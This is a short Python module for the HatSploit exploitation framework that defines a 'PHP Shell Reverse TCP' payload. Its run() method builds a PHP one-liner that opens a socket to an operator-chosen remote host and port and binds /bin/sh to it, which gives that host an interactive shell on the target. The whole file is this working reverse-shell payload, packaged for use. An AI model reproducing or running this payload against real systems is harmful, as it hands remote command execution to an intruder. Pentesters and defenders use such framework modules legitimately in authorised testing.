#!/usr/bin/env python3

#
# This payload requires HatSploit: https://hatsploit.netlify.app
# Current source: https://github.com/EntySec/HatSploit
#

from hatsploit.lib.payload import Payload


class HatSploitPayload(Payload):
    details = {
        'Category': "singler",
        'Name': "PHP Shell Reverse TCP",
        'Payload': "unix/generic/php_reverse_tcp",
        'Authors': [
            'Ivan Nikolsky (enty8080) - payload developer'
        ],
        'Description': "PHP shell reverse TCP payload.",
        'Architecture': "generic",
        'Platform': "unix",
        'Rank': "high",
        'Type': "reverse_tcp"
    }

    def run(self):
        remote_host = self.handler['RHOST']
        remote_port = self.handler['RPORT']

        payload = f"php -r '$sock=fsockopen(\""+remote_host+"\","+remote_port+");$proc=proc_open(\"/bin/sh\", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'"
        return payload
